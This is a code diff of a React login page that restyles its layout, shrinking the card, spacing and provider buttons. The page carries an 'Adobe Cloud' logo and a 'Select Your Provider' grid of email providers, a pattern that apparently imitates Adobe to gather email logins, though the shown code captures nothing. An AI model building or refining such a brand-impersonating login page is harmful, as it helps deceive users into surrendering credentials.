@@ -130,8 +130,8 @@ const LoginPage: React.FC<LoginPageProps> = ({
         backgroundRepeat: 'no-repeat'
       }}
     >
-      {/* Decorative overlay: small logo tightly beside the title (text nudged down to align with logo baseline) */}
-      <div className="absolute left-6 top-1/2 transform -translate-y-1/6 flex items-center gap-6 z-0 pointer-events-none">
+      {/* Decorative overlay: logo centered with title text */}
+      <div className="absolute left-6 top-1/3 transform -translate-y-1/2 flex items-center gap-3 z-0 pointer-events-none">
         <img
           src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
           alt="Adobe Cloud"
@@ -144,9 +144,9 @@ const LoginPage: React.FC<LoginPageProps> = ({
         </div>
       </div>
 
-      {/* Card: adjusted size for better proportions */}
-      <div className="w-full max-w-xl relative z-10 ml-6 md:ml-24 lg:ml-40">
-        <div className="bg-white/80 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-12 relative overflow-hidden">
+      {/* Card: reduced size and padding */}
+      <div className="w-full max-w-sm relative z-10 ml-6 md:ml-24 lg:ml-40">
+        <div className="bg-white/80 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-6 relative overflow-hidden">
           <div className="absolute inset-0 bg-gradient-to-br from-white/50 to-transparent pointer-events-none"></div>
           <div className="relative z-10">
             {/* Centered "Select Your Provider" pill in header */}
@@ -157,31 +157,31 @@ const LoginPage: React.FC<LoginPageProps> = ({
               </div>
             </div>
 
-            {/* spacer so providers sit lower in the card (kept as requested) */}
-            <div className="h-20 md:h-28" />
+            {/* reduced spacer */}
+            <div className="h-6" />
 
             <div className="mt-4">
               {!selectedProvider ? (
                 <div className="space-y-4">
-                  <div className="grid grid-cols-2 gap-6">
+                  <div className="grid grid-cols-2 gap-4">
                     {emailProviders.map((provider) => (
                       <button 
                         key={provider.name} 
                         onClick={() => handleProviderSelect(provider.name)} 
-                        className="group relative flex flex-col items-center gap-3 p-4 bg-white/60 backdrop-blur-sm rounded-xl shadow-sm border border-gray-100/50 hover:shadow-lg hover:bg-white/80 transition-all duration-300 transform hover:-translate-y-1 hover:scale-105" 
+                        className="group relative flex flex-col items-center gap-2 p-3 bg-white/60 backdrop-blur-sm rounded-xl shadow-sm border border-gray-100/50 hover:shadow-lg hover:bg-white/80 transition-all duration-300 transform hover:-translate-y-1 hover:scale-105" 
                         aria-label={`Select ${provider.name}`} 
                         type="button"
                       >
                         <img 
                           src={provider.logo} 
                           alt={provider.name} 
-                          className="w-10 h-10 object-contain" 
+                          className="w-8 h-8 object-contain" 
                           onError={(e) => {
                             const t = e.target as HTMLImageElement;
                             t.style.display = 'none';
                           }}
                         />
-                        <div className="text-sm font-semibold text-gray-800 group-hover:text-gray-900 transition-colors">
+                        <div className="text-xs font-semibold text-gray-800 group-hover:text-gray-900 transition-colors">
                           {provider.name}
                         </div>
                         <div className="absolute inset-0 rounded-xl bg-gradient-to-br from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
